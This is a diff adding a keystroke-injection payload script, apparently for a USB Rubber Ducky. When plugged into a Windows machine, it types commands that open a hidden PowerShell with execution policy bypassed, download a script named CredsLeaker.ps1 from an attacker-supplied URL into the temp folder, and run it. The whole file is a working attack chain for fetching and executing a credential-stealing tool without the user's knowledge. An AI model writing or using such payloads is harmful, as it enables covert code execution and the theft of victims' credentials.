@@ -1,0 +1,16 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+CLEAR
+DELAY 500
+STRING powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass 
+STRING "Invoke-RestMethod -uri \"YOUR_URL/CredsLeaker.ps1\" -OutFile %TEMP%\cl.ps1"
+DELAY 500
+ENTER
+DELAY 500
+STRING powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass -file %TEMP%\cl.ps1 -mode "dynamic"
+DELAY 500
+ENTER
